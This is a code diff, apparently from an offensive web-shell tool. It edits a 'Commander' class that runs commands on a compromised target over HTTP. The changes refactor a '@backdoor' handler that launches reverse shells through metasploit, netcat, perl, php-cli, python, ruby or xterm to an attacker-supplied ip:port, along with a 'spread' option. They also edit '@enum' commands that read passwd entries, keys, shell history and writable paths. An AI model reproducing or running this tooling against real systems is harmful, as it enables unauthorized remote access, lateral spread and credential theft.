@@ -20,7 +20,7 @@ except ImportError:
 else:
     pass
 
-    
+
 class Commander(object):
     '''
     Class to execute commands on the target
@@ -76,32 +76,38 @@ class Commander(object):
 
                     elif command.startswith('@backdoor') or command.startswith('@bd'):
                         if len(command.split()) == 3:
-                            ip = command.split()[2].split(':')[0]
-                            port = command.split()[2].split(':')[1]
-                            #if command.split()[1] == "bash" or command.split()[1] == "sh":
-                            #    backdoor.bash(ip, port)
-                            #elif command.split()[1] == "java":
-                            #    backdoor.java(ip, port)
-                            if command.split()[1] == "metasploit" or command.split()[1] == "msf":
-                                backdoor.msf(ip, port)
-                            #elif command.split()[1] == "metasploit-php" or command.split()[1] == "msf-php":
-                            #    backdoor.msf(ip, port)
-                            elif command.split()[1] == "netcat" or command.split()[1] == "nc":
-                                backdoor.netcat(ip, port)
-                            elif command.split()[1] == "perl" or command.split()[1] == "pl":
-                                backdoor.perl(ip, port)
-                            #elif command.split()[1] == "php":
-                            #    backdoor.php(ip, port)
-                            elif command.split()[1] == "php-cli":
-                                backdoor.php_cli(ip, port)
-                            elif command.split()[1] == "python" or command.split()[1] == "py":
-                                backdoor.python(ip, port)
-                            elif command.split()[1] == "ruby" or command.split()[1] == "rb":
-                                backdoor.ruby(ip, port)
-                            elif command.split()[1] == "xterm":
-                                backdoor.xterm(ip)
-                            else:
+                            try:
+                                ip = command.split()[2].split(':')[0]
+                                port = command.split()[2].split(':')[1]
+                            except:
                                 backdoor.list()
+                                ip = None
+                                pass
+                            if ip:
+                                #if command.split()[1] == "bash" or command.split()[1] == "sh":
+                                #    backdoor.bash(ip, port)
+                                #elif command.split()[1] == "java":
+                                #    backdoor.java(ip, port)
+                                if command.split()[1] == "metasploit" or command.split()[1] == "msf":
+                                    backdoor.msf(ip, port)
+                                #elif command.split()[1] == "metasploit-php" or command.split()[1] == "msf-php":
+                                #    backdoor.msf_php(ip, port)
+                                elif command.split()[1] == "netcat" or command.split()[1] == "nc":
+                                    backdoor.netcat(ip, port)
+                                elif command.split()[1] == "perl" or command.split()[1] == "pl":
+                                    backdoor.perl(ip, port)
+                                #elif command.split()[1] == "php":
+                                #    backdoor.php(ip, port)
+                                elif command.split()[1] == "php-cli":
+                                    backdoor.php_cli(ip, port)
+                                elif command.split()[1] == "python" or command.split()[1] == "py":
+                                    backdoor.python(ip, port)
+                                elif command.split()[1] == "ruby" or command.split()[1] == "rb":
+                                    backdoor.ruby(ip, port)
+                                elif command.split()[1] == "xterm":
+                                    backdoor.xterm(ip)
+                                else:
+                                    backdoor.list()
                         elif len(command.split()) == 2:
                             if command.split()[1] == "spread" or command.split()[1] == "self":
                                 backdoor.spread()
@@ -114,8 +120,8 @@ class Commander(object):
 
                     elif command.startswith('@enum'):
                         if len(command.split()) == 2:
-                            if command.split()[1] == "groups":
-                                enumerate.groups()
+                            if command.split()[1] == "group" or command.split()[1] == "groups":
+                                enumerate.group()
                             elif command.split()[1] == "history":
                                 enumerate.history()
                             elif command.split()[1] == "keys":
@@ -124,12 +130,12 @@ class Commander(object):
                                 enumerate.ip()
                             elif command.split()[1] == "os":
                                 enumerate.os()
+                            elif command.split()[1] == "passwd" or command.split()[1] == "users":
+                                enumerate.passwd()
                             elif command.split()[1] == "system":
                                 enumerate.system()
-                            elif command.split()[1] == "users":
-                                enumerate.users()                            
                             elif command.split()[1] == "writable":
-                                enumerate.writable()                            
+                                enumerate.writable()
                             else:
                                 enumerate.list()
                         else:
@@ -187,9 +193,8 @@ class Commander(object):
                                 command = command.replace('cp', 'cp -v') if command.split()[0] == 'cp' else command
                                 command = command.replace('ifconfig', '/sbin/ifconfig')
 
-                                cmd = 'cd {0};{1}'.format(self.cwd, command)
-
                                 # Get the source code cotenets
+                                cmd = 'cd {0};{1}'.format(self.cwd, command)
                                 source = make_request.get_page_source(cmd)
                                 if source:
                                     for line in source:
